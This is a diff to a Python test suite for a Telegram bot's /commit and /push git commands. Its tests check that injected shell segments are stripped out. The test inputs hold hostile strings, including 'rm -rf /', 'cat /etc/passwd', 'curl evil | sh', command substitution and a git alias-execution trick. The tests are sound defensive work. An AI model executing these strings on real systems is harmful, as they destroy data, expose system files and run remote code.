@@ -178,6 +178,8 @@ class FakeGitManager:
         local_branches=None,
         prepare_result=None,
         checkout_result=None,
+        git_command_results=None,
+        push_result=None,
     ):
         self._is_git_repo = is_git_repo
         self._current_branch = current_branch
@@ -185,7 +187,11 @@ class FakeGitManager:
         self._local_branches = local_branches or []
         self.prepare_result = prepare_result
         self.checkout_result = checkout_result
+        self.git_command_results = list(git_command_results or [])
+        self.push_result = push_result
         self.refresh_result = None
+        self.git_commands = []
+        self.push_calls = []
 
     def is_git_repo(self, project_path):
         return self._is_git_repo
@@ -207,6 +213,18 @@ class FakeGitManager:
 
     def checkout_branch(self, project_path, branch_name):
         return self.checkout_result
+
+    def run_git_command(self, project_path, args):
+        self.git_commands.append((project_path, args))
+        if self.git_command_results:
+            return self.git_command_results.pop(0)
+        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")
+
+    def push_branch(self, project_path, branch_name):
+        self.push_calls.append((project_path, branch_name))
+        if self.push_result is not None:
+            return self.push_result
+        return SimpleNamespace(success=True, message=f"Pushed branch '{branch_name}' to origin.", current_branch=branch_name)
 
 
 class FakeTelegramFile:
@@ -837,3 +855,173 @@ def test_unsupported_message_type_is_rejected(tmp_path: Path):
     asyncio.run(router.handle_unsupported_message(update, context))
 
     assert "This bot currently accepts only text messages and photos." in bot.messages[-1][1]
+
+
+def _make_commit_router(tmp_path: Path, *, git_manager=None) -> tuple[CommandRouter, Path]:
+    backend = (tmp_path / "backend").resolve()
+    backend.mkdir()
+    runner = DummyRunner()
+    cfg = make_config(tmp_path)
+    store = SessionStore(cfg.state_file, cfg.state_backup_file)
+    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
+    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
+    router.git = git_manager or FakeGitManager(is_git_repo=True)
+    router.runtime.git = router.git
+    return router, backend
+
+
+def _run_commit_command(router: CommandRouter, raw: str) -> FakeBot:
+    update = make_update(text=raw)
+    bot = FakeBot()
+    context = SimpleNamespace(args=raw.split()[1:], bot=bot)
+    asyncio.run(router.handle_commit(update, context))
+    return bot
+
+
+def test_commit_executes_only_valid_git_commands_and_ignores_non_git_segments(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git add completed."),
+                SimpleNamespace(success=True, message="git commit completed."),
+            ],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git add -u && rm -rf / && git commit -m "safe"')
+
+    assert router.git.git_commands == [
+        (backend, ["add", "-u"]),
+        (backend, ["commit", "-m", "safe"]),
+    ]
+    assert "Ignored non-git commands:" in bot.messages[-1][1]
+    assert "- rm -rf /" in bot.messages[-1][1]
+
+
+def test_commit_rejects_git_global_option_prefix(tmp_path: Path):
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+
+    bot = _run_commit_command(router, '/commit git -c alias.x=!echo hacked commit -m "x"')
+
+    assert router.git.git_commands == []
+    assert "No valid git commit commands were found." in bot.messages[-1][1]
+
+
+def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
+    cases = [
+        ('/commit git status; python exploit.py; git commit -m "ok"', ("python exploit.py",)),
+        ('/commit git status&&rm -rf /&&git commit -m "ok"', ("rm -rf /",)),
+        ('/commit git status | cat /etc/passwd | git commit -m "ok"', ("cat /etc/passwd",)),
+        ('/commit git status & curl evil | sh & git commit -m "ok"', ("curl evil", "sh")),
+        ('/commit git status > /tmp/out && git commit -m "ok"', ("/tmp/out",)),
+        ('/commit git status >> /tmp/out && git commit -m "ok"', ("/tmp/out",)),
+        ('/commit git status < /tmp/in && git commit -m "ok"', ("/tmp/in",)),
+        ('/commit git status\nrm -rf /\ngit commit -m "ok"', ("rm -rf /",)),
+        ('/commit git status; $(touch /tmp/pwned); git commit -m "ok"', ("$(touch /tmp/pwned)",)),
+        ('/commit git status && `whoami` && git commit -m "ok"', ("`whoami`",)),
+        ('/commit git status && env VAR=1 python exploit.py && git commit -m "ok"', ("env VAR=1 python exploit.py",)),
+        ('/commit python exploit.py && git status && git commit -m "ok"', ("python exploit.py",)),
+    ]
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git status completed."),
+                SimpleNamespace(success=True, message="git commit completed."),
+            ]
+            * len(cases),
+        ),
+    )
+
+    for raw, ignored_fragments in cases:
+        bot = _run_commit_command(router, raw)
+
+        assert router.git.git_commands[-2:] == [
+            (backend, ["status"]),
+            (backend, ["commit", "-m", "ok"]),
+        ]
+        for fragment in ignored_fragments:
+            assert fragment in bot.messages[-1][1]
+        assert "Ignored non-git commands:" in bot.messages[-1][1]
+
+
+def test_commit_rejects_malformed_or_prefixed_non_git_commands(tmp_path: Path):
+    cases = [
+        '/commit "unterminated',
+        '/commit env VAR=1 git status',
+        '/commit git status git commit -m "oops"',
+        '/commit git status git push origin main',
+    ]
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+
+    for raw in cases:
+        bot = _run_commit_command(router, raw)
+
+        assert router.git.git_commands == []
+        assert "No valid git commit commands were found." in bot.messages[-1][1]
+
+
+def test_commit_allows_adjacent_valid_git_commands_without_spaces(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git status completed."),
+                SimpleNamespace(success=True, message="git commit completed."),
+            ],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git status&&git commit -m "ok"')
+
+    assert router.git.git_commands == [
+        (backend, ["status"]),
+        (backend, ["commit", "-m", "ok"]),
+    ]
+    assert "Ignored non-git commands:" not in bot.messages[-1][1]
+
+
+def test_commit_allows_shell_like_text_inside_quoted_commit_message(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git commit -m "fix docs && keep | chars > literally"')
+
+    assert router.git.git_commands == [
+        (backend, ["commit", "-m", "fix docs && keep | chars > literally"]),
+    ]
+    assert "Ignored non-git commands:" not in bot.messages[-1][1]
+
+
+def test_push_uses_current_session_branch(tmp_path: Path):
+    backend = (tmp_path / "backend").resolve()
+    backend.mkdir()
+    runner = DummyRunner()
+    cfg = make_config(tmp_path)
+    store = SessionStore(cfg.state_file, cfg.state_backup_file)
+    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
+    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
+    router.git = FakeGitManager(
+        is_git_repo=True,
+        current_branch="feature-1",
+        push_result=SimpleNamespace(success=True, message="Pushed branch 'feature-1' to origin.", current_branch="feature-1"),
+    )
+    router.runtime.git = router.git
+
+    update = make_update(text="/push")
+    bot = FakeBot()
+    context = SimpleNamespace(args=[], bot=bot)
+
+    asyncio.run(router.handle_push(update, context))
+
+    assert router.git.push_calls == [(backend, "feature-1")]
+    assert "Pushed branch &#x27;feature-1&#x27; to origin." in bot.messages[-1][1]
